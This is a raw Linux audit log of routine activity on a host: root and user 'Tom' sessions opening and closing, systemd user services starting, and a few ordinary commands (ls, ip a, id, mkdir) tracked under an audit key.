type=PATH msg=audit(1789320623.281:80): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789320623.281:80): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789320623.281:80): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789320623.281:80): proctitle=6C73002D2D636F6C6F723D6175746F
type=SYSCALL msg=audit(1789320641.033:81): arch=c000003e syscall=59 success=yes exit=0 a0=55f4be9c44d0 a1=55f4be9da4f0 a2=55f4be9ddaa0 a3=768216f1f78166c6 items=3 ppid=841 pid=846 auid=0 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="root" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789320641.033:81): argc=2 a0="ip" a1="a"
type=CWD msg=audit(1789320641.033:81): cwd="/home/Tom"
type=PATH msg=audit(1789320641.033:81): item=0 name="/usr/sbin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789320641.033:81): item=1 name="/usr/sbin/ip" inode=399036 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789320641.033:81): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789320641.033:81): proctitle=69700061
type=USER_END msg=audit(1789320647.677:82): pid=840 uid=0 auid=0 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_env,pam_env,pam_mail,pam_limits,pam_permit,pam_unix,pam_systemd acct="Tom" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789320647.681:83): pid=840 uid=0 auid=0 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_rootok acct="Tom" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789320760.185:84): pid=621 uid=0 auid=0 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_selinux,pam_loginuid,pam_selinux,pam_env,pam_env,pam_limits,pam_lastlog,pam_mail,pam_keyinit,pam_permit,pam_unix,pam_systemd acct="root" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="root"
type=SERVICE_STOP msg=audit(1789320760.189:85): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789320760.193:86): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789320760.193:87): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789320760.213:88): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=CRED_DISP msg=audit(1789320770.257:89): pid=769 uid=0 auid=0 ses=2 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789320770.257:90): pid=769 uid=0 auid=0 ses=2 subj=unconfined msg='op=PAM:session_close grantors=pam_selinux,pam_selinux,pam_loginuid,pam_limits,pam_permit,pam_unix,pam_keyinit,pam_systemd acct="root" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="root"
type=SERVICE_STOP msg=audit(1789320770.257:91): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user@0 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789320770.353:92): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user-runtime-dir@0 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789320905.005:93): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily-upgrade comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789320905.005:94): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily-upgrade comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789321156.105:95): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-tmpfiles-clean comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789321156.105:96): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-tmpfiles-clean comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_AUTH msg=audit(1789321990.881:97): pid=872 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789321990.881:98): pid=872 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789321990.881:99): pid=872 uid=0 subj=unconfined old-auid=4294967295 auid=1000 tty=tty1 old-ses=4294967295 ses=3 res=1UID="root" OLD-AUID="unset" AUID="Tom"
type=SYSCALL msg=audit(1789321990.881:99): arch=c000003e syscall=1 success=yes exit=4 a0=3 a1=7fff02e76e20 a2=4 a3=7fff02e76b34 items=0 ppid=1 pid=872 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=tty1 ses=3 comm="login" exe="/usr/bin/login" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="Tom" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789321990.881:99): proctitle=2F62696E2F6C6F67696E002D70002D2D
type=SERVICE_START msg=audit(1789321990.949:100): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user-runtime-dir@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789321990.957:101): pid=940 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789321990.957:102): pid=940 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789321990.957:103): pid=940 uid=0 subj=unconfined old-auid=4294967295 auid=1000 tty=(none) old-ses=4294967295 ses=4 res=1UID="root" OLD-AUID="unset" AUID="Tom"
type=SYSCALL msg=audit(1789321990.957:103): arch=c000003e syscall=1 success=yes exit=4 a0=7 a1=7fffd5026560 a2=4 a3=7fffd5026274 items=0 ppid=1 pid=940 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4 comm="(systemd)" exe="/usr/lib/systemd/systemd" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="Tom" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789321990.957:103): proctitle="(systemd)"
type=USER_START msg=audit(1789321990.961:104): pid=940 uid=0 auid=1000 ses=4 subj=unconfined msg='op=PAM:session_open grantors=pam_selinux,pam_selinux,pam_loginuid,pam_limits,pam_permit,pam_unix,pam_keyinit,pam_systemd acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="Tom"
type=SYSCALL msg=audit(1789321990.961:105): arch=c000003e syscall=59 success=yes exit=0 a0=561d5ac4c1f0 a1=561d5ac94c60 a2=561d5ac6b4d0 a3=0 items=3 ppid=1 pid=940 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=4 comm="systemd" exe="/usr/lib/systemd/systemd" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789321990.961:105): argc=2 a0="/lib/systemd/systemd" a1="--user"
type=CWD msg=audit(1789321990.961:105): cwd="/"
type=PATH msg=audit(1789321990.961:105): item=0 name="/lib/systemd/systemd" inode=396257 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321990.961:105): item=1 name="/lib/systemd/systemd" inode=396257 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321990.961:105): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789321990.961:105): proctitle="(systemd)"
type=SYSCALL msg=audit(1789321990.997:106): arch=c000003e syscall=59 success=yes exit=0 a0=556b89e62070 a1=7fff0a352b70 a2=7fff0a353420 a3=0 items=3 ppid=942 pid=943 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=4 comm="30-systemd-envi" exe="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789321990.997:106): argc=1 a0="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator"
type=CWD msg=audit(1789321990.997:106): cwd="/"
type=PATH msg=audit(1789321990.997:106): item=0 name="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator" inode=397675 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321990.997:106): item=1 name="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator" inode=397675 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321990.997:106): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789321990.997:106): proctitle="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator"
type=SYSCALL msg=audit(1789321991.009:107): arch=c000003e syscall=59 success=yes exit=0 a0=556b89e65a90 a1=7fff0a352be0 a2=556b89e65b30 a3=d86805f61689d7ab items=3 ppid=944 pid=945 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=4 comm="systemd-xdg-aut" exe="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789321991.009:107): argc=4 a0="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" a1="/run/user/1000/systemd/generator" a2="/run/user/1000/systemd/generator.early" a3="/run/user/1000/systemd/generator.late"
type=CWD msg=audit(1789321991.009:107): cwd="/"
type=PATH msg=audit(1789321991.009:107): item=0 name="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" inode=397676 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321991.009:107): item=1 name="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" inode=397676 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321991.009:107): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789321991.009:107): proctitle=2F7573722F6C69622F73797374656D642F757365722D67656E657261746F72732F73797374656D642D7864672D6175746F73746172742D67656E657261746F72002F72756E2F757365722F313030302F73797374656D642F67656E657261746F72002F72756E2F757365722F313030302F73797374656D642F67656E65726174
type=SYSCALL msg=audit(1789321991.125:108): arch=c000003e syscall=59 success=yes exit=0 a0=556b89e9cd80 a1=556b89e8c900 a2=556b89e6a9d0 a3=10 items=3 ppid=940 pid=946 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=4 comm="systemctl" exe="/usr/bin/systemctl" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789321991.125:108): argc=4 a0="/bin/systemctl" a1="--user" a2="set-environment" a3="DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus"
type=CWD msg=audit(1789321991.125:108): cwd="/home/Tom"
type=PATH msg=audit(1789321991.125:108): item=0 name="/bin/systemctl" inode=393580 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321991.125:108): item=1 name="/bin/systemctl" inode=393580 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321991.125:108): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789321991.125:108): proctitle=2F62696E2F73797374656D63746C002D2D75736572007365742D656E7669726F6E6D656E7400444255535F53455353494F4E5F4255535F414444524553533D756E69783A706174683D2F72756E2F757365722F313030302F627573
type=SERVICE_START msg=audit(1789321991.137:109): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_START msg=audit(1789321991.141:110): pid=872 uid=0 auid=1000 ses=3 subj=unconfined msg='op=PAM:session_open grantors=pam_selinux,pam_loginuid,pam_selinux,pam_env,pam_env,pam_limits,pam_lastlog,pam_mail,pam_keyinit,pam_permit,pam_unix,pam_systemd acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=CRED_ACQ msg=audit(1789321991.145:111): pid=872 uid=0 auid=1000 ses=3 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=USER_LOGIN msg=audit(1789321991.145:112): pid=872 uid=0 auid=1000 ses=3 subj=unconfined msg='op=login acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=SYSCALL msg=audit(1789321991.145:113): arch=c000003e syscall=59 success=yes exit=0 a0=55bead842c70 a1=7fff02e76aa0 a2=55bead842db0 a3=0 items=3 ppid=872 pid=947 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="bash" exe="/usr/bin/bash" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789321991.145:113): argc=1 a0="-bash"
type=CWD msg=audit(1789321991.145:113): cwd="/home/Tom"
type=PATH msg=audit(1789321991.145:113): item=0 name="/bin/bash" inode=393054 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321991.145:113): item=1 name="/bin/bash" inode=393054 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321991.145:113): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789321991.145:113): proctitle="-bash"
type=SYSCALL msg=audit(1789321991.149:114): arch=c000003e syscall=59 success=yes exit=0 a0=562893ad1910 a1=562893ad2450 a2=562893acf060 a3=8 items=3 ppid=947 pid=948 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="id" exe="/usr/bin/id" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789321991.149:114): argc=2 a0="id" a1="-u"
type=CWD msg=audit(1789321991.149:114): cwd="/home/Tom"
type=PATH msg=audit(1789321991.149:114): item=0 name="/usr/bin/id" inode=393398 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321991.149:114): item=1 name="/usr/bin/id" inode=393398 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321991.149:114): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789321991.149:114): proctitle=6964002D75
type=SYSCALL msg=audit(1789321991.169:115): arch=c000003e syscall=59 success=yes exit=0 a0=562893b9de00 a1=562893bb14f0 a2=562893ad2390 a3=0 items=3 ppid=947 pid=949 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="dircolors" exe="/usr/bin/dircolors" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789321991.169:115): argc=2 a0="dircolors" a1="-b"
type=CWD msg=audit(1789321991.169:115): cwd="/home/Tom"
type=PATH msg=audit(1789321991.169:115): item=0 name="/usr/bin/dircolors" inode=393386 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321991.169:115): item=1 name="/usr/bin/dircolors" inode=393386 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321991.169:115): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789321991.169:115): proctitle=646972636F6C6F7273002D62
type=SYSCALL msg=audit(1789321994.313:116): arch=c000003e syscall=59 success=yes exit=0 a0=562893b24710 a1=562893b56710 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=950 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789321994.313:116): argc=2 a0="ls" a1="--color=auto"
type=CWD msg=audit(1789321994.313:116): cwd="/home/Tom"
type=PATH msg=audit(1789321994.313:116): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321994.313:116): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321994.313:116): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789321994.313:116): proctitle=6C73002D2D636F6C6F723D6175746F
type=SYSCALL msg=audit(1789321997.637:117): arch=c000003e syscall=59 success=yes exit=0 a0=562893b44e30 a1=562893b3ddd0 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=951 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789321997.637:117): argc=3 a0="ls" a1="--color=auto" a2="-la"
type=CWD msg=audit(1789321997.637:117): cwd="/home/Tom"
type=PATH msg=audit(1789321997.637:117): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321997.637:117): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789321997.637:117): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789321997.637:117): proctitle=6C73002D2D636F6C6F723D6175746F002D6C61
type=SYSCALL msg=audit(1789322059.349:118): arch=c000003e syscall=59 success=yes exit=0 a0=562893bb31b0 a1=562893bce350 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=953 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="mkdir" exe="/usr/bin/mkdir" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322059.349:118): argc=2 a0="mkdir" a1=".cache"
type=CWD msg=audit(1789322059.349:118): cwd="/home/Tom"
type=PATH msg=audit(1789322059.349:118): item=0 name="/usr/bin/mkdir" inode=393358 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322059.349:118): item=1 name="/usr/bin/mkdir" inode=393358 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322059.349:118): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322059.349:118): proctitle=6D6B646972002E6361636865
type=SYSCALL msg=audit(1789322069.341:119): arch=c000003e syscall=59 success=yes exit=0 a0=562893bb31b0 a1=562893bce330 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=956 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="mkdir" exe="/usr/bin/mkdir" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322069.341:119): argc=2 a0="mkdir" a1="pip"
type=CWD msg=audit(1789322069.341:119): cwd="/home/Tom/.cache"
